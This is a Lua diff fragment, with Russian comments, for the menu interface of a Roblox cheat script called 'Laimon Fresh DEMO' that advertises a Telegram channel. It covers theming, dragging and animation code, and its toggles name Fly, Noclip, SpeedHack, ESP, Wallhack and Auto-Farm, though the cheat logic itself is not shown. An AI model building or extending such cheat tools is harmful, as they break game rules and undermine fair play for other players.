+local player = game.Players.LocalPlayer
+local userId = player.UserId
+UserAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
+
+local AvatarCorner = Instance.new("UICorner")
+AvatarCorner.CornerRadius = UDim.new(0, 10)
+AvatarCorner.Parent = UserAvatar
+
+-- Информация о пользователе
+local UserInfoContainer = Instance.new("Frame")
+UserInfoContainer.Name = "UserInfoContainer"
+UserInfoContainer.Size = UDim2.new(0, 155, 0, 45)
+UserInfoContainer.Position = UDim2.new(0, 75, 0, 10)
+UserInfoContainer.BackgroundTransparency = 1
+UserInfoContainer.Parent = UserInfoFrame
+
+local DisplayName = Instance.new("TextLabel")
+DisplayName.Name = "DisplayName"
+DisplayName.Size = UDim2.new(1, 0, 0, 25)
+DisplayName.Position = UDim2.new(0, 0, 0.2, 0)
+DisplayName.BackgroundTransparency = 1
+DisplayName.Text = player.DisplayName
+DisplayName.TextColor3 = CurrentTheme.Text
+DisplayName.Font = Enum.Font.GothamBold
+DisplayName.TextSize = 14
+DisplayName.TextXAlignment = Enum.TextXAlignment.Left
+DisplayName.Parent = UserInfoContainer
+
+local Username = Instance.new("TextLabel")
+Username.Name = "Username"
+Username.Size = UDim2.new(1, 0, 0, 18)
+Username.Position = UDim2.new(0, 0, 0.15, 25)
+Username.BackgroundTransparency = 1
+Username.Text = "@" .. player.Name
+Username.TextColor3 = CurrentTheme.TextSecondary
+Username.Font = Enum.Font.Gotham
+Username.TextSize = 11
+Username.TextXAlignment = Enum.TextXAlignment.Left
+Username.Parent = UserInfoContainer
+
+-- Текст с ссылкой
+local LinkText = Instance.new("TextLabel")
+LinkText.Name = "LinkText"
+LinkText.Size = UDim2.new(1, 0, 0, 20)
+LinkText.Position = UDim2.new(0, 0, 0, 65)
+LinkText.BackgroundTransparency = 1
+LinkText.Text = "t.me/FBScripts"
+LinkText.TextColor3 = CurrentTheme.Text
+LinkText.Font = Enum.Font.Gotham
+LinkText.TextSize = 11
+LinkText.TextXAlignment = Enum.TextXAlignment.Center
+LinkText.Parent = UserInfoFrame
+
+table.insert(UIElements.TextLabels, LinkText)
+
+-- ВОССТАНОВЛЕННОЕ ПРИВЕТСТВЕННОЕ СООБЩЕНИЕ
+local WelcomeFrame = Instance.new("Frame")
+WelcomeFrame.Name = "WelcomeFrame"
+WelcomeFrame.Size = UDim2.new(1, -240, 1, -35)
+WelcomeFrame.Position = UDim2.new(0, 240, 0, 35)
+WelcomeFrame.BackgroundTransparency = 1
+WelcomeFrame.Visible = true
+WelcomeFrame.Parent = MainFrame
+
+local WelcomeText = Instance.new("TextLabel")
+WelcomeText.Name = "WelcomeText"
+WelcomeText.Size = UDim2.new(1, -40, 1, -40)
+WelcomeText.Position = UDim2.new(0, 20, 0, 20)
+WelcomeText.BackgroundTransparency = 1
+WelcomeText.Text = "Welcome to Laimon Fresh DEMO!\n\nThank you for using our script!\n\nFeatures:\n• Customizable themes\n• Player utilities\n• ESP system\n• Auto-Farm\n• Anti-AFK\n\nSelect a tab to get started!"
+WelcomeText.TextColor3 = CurrentTheme.Text
+WelcomeText.Font = Enum.Font.GothamBold
+WelcomeText.TextSize = 14
+WelcomeText.TextWrapped = true
+WelcomeText.TextXAlignment = Enum.TextXAlignment.Center
+WelcomeText.TextYAlignment = Enum.TextYAlignment.Center
+WelcomeText.Parent = WelcomeFrame
+
+-- Текст DEMO версии
+local DemoText = Instance.new("TextLabel")
+DemoText.Name = "DemoText"
+DemoText.Size = UDim2.new(0, 70, 1, 0)
+DemoText.Position = UDim2.new(0, 99, 0, 0)
+DemoText.BackgroundTransparency = 1
+DemoText.Text = "DEMO v1.0"
+DemoText.TextColor3 = Color3.fromRGB(120, 120, 120)  -- Темно-серый цвет
+DemoText.Font = Enum.Font.Gotham
+DemoText.TextSize = 10
+DemoText.TextXAlignment = Enum.TextXAlignment.Left
+DemoText.ZIndex = 12
+DemoText.Parent = TitleContainer
+
+table.insert(UIElements.TextLabels, DemoText)
+
+table.insert(UIElements.TextLabels, WelcomeText)
+
+-- Функция для скрытия приветственного сообщения при открытии вкладки
+local function hideWelcomeOnTabClick()
+    WelcomeFrame.Visible = false
+end
+
+-- Добавляем обработчики для скрытия приветственного сообщения
+for _, tabButton in pairs(UIElements.TabButtonsList) do
+    tabButton.MouseButton1Click:Connect(hideWelcomeOnTabClick)
+end
+
+-- ВОССТАНОВЛЕННАЯ АНИМАЦИЯ ЗВЕЗД
+local function createStars()
+    local starsContainer = Instance.new("Frame")
+    starsContainer.Name = "StarsContainer"
+    starsContainer.Size = UDim2.new(1, 0, 1, 0)
+    starsContainer.Position = UDim2.new(0, 0, 0, 0)
+    starsContainer.BackgroundTransparency = 1
+    starsContainer.ZIndex = 0
+    starsContainer.Parent = MainFrame
+    
+    for i = 1, 25 do
+        local star = Instance.new("TextLabel")
+        star.Size = UDim2.new(0, math.random(10, 20), 0, math.random(10, 20))
+        star.Position = UDim2.new(0, math.random(10, 480), 0, math.random(10, 330))
+        star.BackgroundTransparency = 1
+        star.Text = "★"
+        star.TextColor3 = Color3.fromRGB(255, 255, 255)
+        star.TextTransparency = math.random(2, 6) / 10
+        star.Font = Enum.Font.GothamBold
+        star.TextSize = math.random(12, 18)
+        star.ZIndex = 0
+        star.Parent = starsContainer
+        
+        -- Анимация мерцания
+        local twinkleTween = TweenService:Create(
+            star,
+            TweenInfo.new(math.random(1, 3), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {TextTransparency = math.random(1, 8) / 10}
+        )
+        twinkleTween:Play()
+        
+        -- Анимация движения
+        local moveTween = TweenService:Create(
+            star,
+            TweenInfo.new(math.random(5, 10), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {Position = UDim2.new(0, math.random(10, 480), 0, math.random(10, 330))}
+        )
+        moveTween:Play()
+        
+        -- Анимация изменения размера
+        local scaleTween = TweenService:Create(
+            star,
+            TweenInfo.new(math.random(2, 4), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {TextSize = math.random(10, 16)}
+        )
+        scaleTween:Play()
+    end
+    
+    return starsContainer
+end
+
+local function removeStars()
+    local starsContainer = MainFrame:FindFirstChild("StarsContainer")
+    if starsContainer then
+        starsContainer:Destroy()
+    end
+end
+
+local function toggleStars()
+    starsEnabled = not starsEnabled
+    if starsEnabled then
+        StarButton.Text = "★"
+        createStars()
+    else
+        StarButton.Text = "☆"
+        removeStars()
+    end
+end
+
+StarButton.MouseButton1Click:Connect(toggleStars)
+
+-- Функция для сворачивания панели
+local function minimizePanel()
+    if isPanelMinimized then return end
+    isPanelMinimized = true
+    
+    lastPanelPosition = MainFrame.Position
+    
+    TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(lastPanelPosition.X.Scale, lastPanelPosition.X.Offset, 0, -400)
+    }):Play()
+    
+    CircleButton.Visible = true
+    CircleButton.BackgroundTransparency = 1
+    CircleButton.UIStroke.Transparency = 1
+    CircleButton.Size = UDim2.new(0, 0, 0, 0)
+    CircleButton.Position = lastCirclePosition
+    
+    -- Сбрасываем прозрачность текста перед анимацией
+    CircleText.TextTransparency = 1
+    
+    -- Параллельно плавно появляем круг и текст
+    TweenService:Create(CircleButton, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0,
+        Size = UDim2.new(0, 50, 0, 50)
+    }):Play()
+    
+    TweenService:Create(CircleButton.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Transparency = 0
+    }):Play()
+    
+    -- Плавное появление текста с небольшой задержкой
+    delay(0.3, function()
+        TweenService:Create(CircleText, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            TextTransparency = 0
+        }):Play()
+    end)
+    
+    -- Скрываем панель после анимации
+    wait(0.7)
+    MainFrame.Visible = false
+end
+
+-- Функция для разворачивания панели
+local function maximizePanel()
+    if not isPanelMinimized then return end
+    isPanelMinimized = false
+    
+    lastCirclePosition = CircleButton.Position
+    
+    -- Показываем панель в последней позиции (но за пределами экрана сверху)
+    MainFrame.Visible = true
+    MainFrame.Position = UDim2.new(lastPanelPosition.X.Scale, lastPanelPosition.X.Offset, 0, -400)
+    
+    -- Плавно скрываем текст
+    TweenService:Create(CircleText, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        TextTransparency = 1
+    }):Play()
+    
+    -- Плавно скрываем круг
+    TweenService:Create(CircleButton, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 0, 0, 0)
+    }):Play()
+    
+    TweenService:Create(CircleButton.UIStroke, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Transparency = 1
+    }):Play()
+    
+    -- Параллельно плавно опускаем панель в последнюю позицию
+    TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = lastPanelPosition
+    }):Play()
+    
+    -- Скрываем круг после анимации
+    wait(0.4)
+    CircleButton.Visible = false
+end
+
+MinimizeButton.MouseButton1Click:Connect(minimizePanel)
+CircleButton.MouseButton1Click:Connect(maximizePanel)
+
+-- Перемещение круга
+local isCircleDragging = false
+local circleDragStartPos, circleFrameStartPos
+
+CircleButton.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isCircleDragging = true
+        circleDragStartPos = input.Position
+        circleFrameStartPos = CircleButton.Position
+    end
+end)
+
+CircleButton.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isCircleDragging = false
+        lastCirclePosition = CircleButton.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isCircleDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - circleDragStartPos
+        local newPosition = UDim2.new(
+            circleFrameStartPos.X.Scale, 
+            circleFrameStartPos.X.Offset + delta.X,
+            circleFrameStartPos.Y.Scale, 
+            circleFrameStartPos.Y.Offset + delta.Y
+        )
+        CircleButton.Position = newPosition
+    end
+end)
+
+-- Перемещение окна
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = true
+        dragStartPos = input.Position
+        frameStartPos = MainFrame.Position
+    end
+end)
+
+TitleBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = false
+        lastPanelPosition = MainFrame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStartPos
+        local newPosition = UDim2.new(
+            frameStartPos.X.Scale, 
+            frameStartPos.X.Offset + delta.X,
+            frameStartPos.Y.Scale, 
+            frameStartPos.Y.Offset + delta.Y
+        )
+        MainFrame.Position = newPosition
+    end
+end)
+
+-- Функция для скрытия меню по бинду
+local function hideMenuByBind()
+    if isPanelMinimized then return end
+    menuVisible = false
+    MainFrame.Visible = false
+    CircleButton.Visible = false
+    isPanelMinimized = false
+end
+
+-- Функция для показа меню по бинду
+local function showMenuByBind()
+    if MainFrame.Visible then return end
+    menuVisible = true
+    isPanelMinimized = false
+    MainFrame.Visible = true
+    MainFrame.Position = lastPanelPosition
+    CircleButton.Visible = false
+end
+
+-- Обработка бинда скрытия/показа
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == hideBind then
+        if MainFrame.Visible then
+            hideMenuByBind()
+        else
+            showMenuByBind()
+        end
+    end
+end)
+
+-- ИСПРАВЛЕННАЯ ФУНКЦИЯ СМЕНЫ ТЕМЫ
+local ThemeCircleColors = {
+    Color3.fromRGB(147, 112, 219),
+    Color3.fromRGB(220, 20, 60),
+    Color3.fromRGB(50, 200, 50),
+    Color3.fromRGB(255, 215, 0),
+    Color3.fromRGB(65, 105, 225),
+    Color3.fromRGB(80, 80, 80),
+    Color3.fromRGB(255, 255, 255)
+}
+
+-- Функция применения темы с ИСПРАВЛЕНИЕМ цвета кнопок
+function applyTheme(theme)
+    CurrentTheme = theme
+    
+    
+    -- Применяем цвета ко всем элементам
+    TweenService:Create(UIElements.MainFrame, TweenInfo.new(0.3), {BackgroundColor3 = theme.MainBackground}):Play()
+    TweenService:Create(UIElements.TitleBar, TweenInfo.new(0.3), {BackgroundColor3 = theme.TitleBar}):Play()
+    TweenService:Create(UIElements.TabButtons, TweenInfo.new(0.3), {BackgroundColor3 = theme.TabBackground}):Play()
+    
+    -- Обновляем кнопки вкладок
+    for _, tabButton in pairs(UIElements.TabButtonsList) do
+        local isActive = tabButton.BackgroundColor3 == CurrentTheme.TabButtonActive
+        TweenService:Create(tabButton, TweenInfo.new(0.3), {
+            BackgroundColor3 = isActive and theme.TabButtonActive or theme.TabButtonInactive,
+            TextColor3 = theme.Text
+        }):Play()
+    end
+    
+    -- Обновляем тогглы с сохранением состояния активных функций
+    for _, toggle in pairs(UIElements.ToggleButtons) do
+        local isOn = false
+        if toggle == FlyToggleButton then
+            isOn = ActiveFunctions.Fly
+        elseif toggle == NoclipToggleButton then
+            isOn = ActiveFunctions.Noclip
+        elseif toggle == SpeedHackToggleButton then
+            isOn = ActiveFunctions.SpeedHack
+        elseif toggle == InfinityJumpToggleButton then
+            isOn = ActiveFunctions.InfinityJump
+        elseif toggle == AutoFarmToggleButton then
+            isOn = ActiveFunctions.AutoFarm
+        else
+            isOn = ActiveFunctions.AntiAFK
+        end
+        TweenService:Create(toggle, TweenInfo.new(0.3), {
+            BackgroundColor3 = isOn and theme.ToggleOn or theme.ToggleOff
+        }):Play()
+    end
+    
+    -- Обновляем дропдауны и кнопки биндов
+    for _, button in pairs(UIElements.DropdownButtons) do
+        TweenService:Create(button, TweenInfo.new(0.3), {
+            BackgroundColor3 = theme.Button,
+            TextColor3 = theme.Text
+        }):Play()
+    end
+    
+    for _, button in pairs(UIElements.KeybindButtons) do
+        if button.Text ~= "[Press Key]" then
+            TweenService:Create(button, TweenInfo.new(0.3), {
+                BackgroundColor3 = theme.Button,
+                TextColor3 = theme.Text
+            }):Play()
+        end
+    end
+
+    -- Обновляем ESP кнопки
+    for _, button in pairs(UIElements.ESPButtons) do
+        if button.Name:find("RGB") then
+            -- Кнопки RGB меняют цвет в зависимости от состояния
+            local isActive = false
+            if button == NamesRGBButton then
+                isActive = NamesButton.Text == "Names ON" and button.BackgroundColor3 == CurrentTheme.ToggleOn
+            elseif button == RolesRGBButton then
+                isActive = RolesButton.Text == "Roles ON" and button.BackgroundColor3 == CurrentTheme.ToggleOn
+            elseif button == WallhackRGBButton then
+                isActive = WallhackButton.Text == "Wallhack ON" and button.BackgroundColor3 == CurrentTheme.ToggleOn
+            else
+                isActive = button.BackgroundColor3 == CurrentTheme.ToggleOn
+            end
+            
+            TweenService:Create(button, TweenInfo.new(0.3), {
+                BackgroundColor3 = isActive and theme.ToggleOn or theme.Button,
+                TextColor3 = theme.Text
+            }):Play()
+        elseif button == WallhackStyleButton then
+            -- Кнопка стиля Wallhack
+            TweenService:Create(button, TweenInfo.new(0.3), {
+                BackgroundColor3 = theme.Button,
+                TextColor3 = theme.Text
+            }):Play()
+        else
+            -- Основные ESP кнопки
+            local isActive = button.Text:find("ON")
+            TweenService:Create(button, TweenInfo.new(0.3), {
+                BackgroundColor3 = isActive and theme.ToggleOn or theme.Button,
+                TextColor3 = theme.Text
+            }):Play()
+        end
+    end
+
+    -- Обновляем Auto-Farm элементы
+    for _, element in pairs(UIElements.AutoFarmElements) do
+        if element:IsA("TextButton") then
+            local isActive = element.Text:find("ON")
+            TweenService:Create(element, TweenInfo.new(0.3), {
+                BackgroundColor3 = isActive and theme.ToggleOn or theme.Button,
+                TextColor3 = theme.Text
+            }):Play()
+        elseif element:IsA("TextLabel") then
+            if element.Text == "Not recommended above 24" then
+                TweenService:Create(element, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 50, 50)}):Play()
+            else
+                TweenService:Create(element, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+            end
+        end
+    end
+
+    -- Обновляем Info элементы
+    for _, element in pairs(UIElements.InfoElements) do
+        if element:IsA("TextLabel") then
+            TweenService:Create(element, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+        end
+    end
+
+    -- Обновляем цвет круга (такой же как у фона панели)
+    TweenService:Create(CircleButton, TweenInfo.new(0.3), {BackgroundColor3 = theme.MainBackground}):Play()
+
+    -- Обновляем текст
+    TweenService:Create(FreshText, TweenInfo.new(0.3), {TextColor3 = theme.Accent}):Play()
+    -- Обновляем текст DEMO версии
+    TweenService:Create(DemoText, TweenInfo.new(0.3), {TextColor3 = theme.Accent}):Play()
+
+    TweenService:Create(DisplayName, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+    TweenService:Create(Username, TweenInfo.new(0.3), {TextColor3 = theme.TextSecondary}):Play()
+    TweenService:Create(UserAvatar, TweenInfo.new(0.3), {BackgroundColor3 = theme.Button}):Play()
+    TweenService:Create(LinkText, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+    TweenService:Create(WelcomeText, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+    
+    -- Обновляем все текстовые лейблы
+    for _, label in pairs(UIElements.TextLabels) do
+        if label.Text == "Risk" or label.Text == "Not recommended above 24" then
+            TweenService:Create(label, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 50, 50)}):Play()
+        else
+            TweenService:Create(label, TweenInfo.new(0.3), {TextColor3 = theme.Text}):Play()
+        end
+    end
+    
+    -- Обновляем звездочку
+    TweenService:Create(StarButton, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+    
+    -- Обновляем цвет кнопки сворачивания и текста на круге для светлой темы
+    if theme.name == "White" then
+        TweenService:Create(MinimizeButton, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+        TweenService:Create(CircleText, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+    else
+        TweenService:Create(MinimizeButton, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        TweenService:Create(CircleText, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+    end
+end
+
+for i = 1, 7 do
+    local CircleButton = Instance.new("TextButton")
+    CircleButton.Name = "ThemeCircle" .. i
+    CircleButton.Size = UDim2.new(0, 16, 0, 16)
+    CircleButton.Position = UDim2.new(0, (i-1)*24 + 10, 0.5, -8)
+    CircleButton.Text = ""
+    CircleButton.BackgroundColor3 = ThemeCircleColors[i]
+    CircleButton.AutoButtonColor = false
+    CircleButton.BorderSizePixel = 0
+    CircleButton.ZIndex = 12
+    CircleButton.Parent = ThemeCirclesContainer
+    
+    local CircleCorner = Instance.new("UICorner")
+    CircleCorner.CornerRadius = UDim.new(1, 0)
+    CircleCorner.Parent = CircleButton
+    
+    CircleButton.MouseButton1Click:Connect(function()
+        applyTheme(ColorThemes[i])
+    end)
+end
+
+-- Функция для показа основного интерфейса
+local function showMainInterface()
+    LoadingGui:Destroy()
+    
+    CircleButton.Visible = false
+    isPanelMinimized = false
+    
+    MainFrame.Position = lastPanelPosition
+    
+    ScreenGui.Enabled = true
+    MainFrame.Visible = true
+    
+    local currentPos = MainFrame.Position
+    MainFrame.Position = UDim2.new(currentPos.X.Scale, currentPos.X.Offset, currentPos.Y.Scale, currentPos.Y.Offset - 20)
+    
+    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = lastPanelPosition
+    }):Play()
+end
+
+-- Запускаем процесс загрузки с защитой от зависания
+spawn(function()
+    wait(2)
+    showMainInterface()
+end)
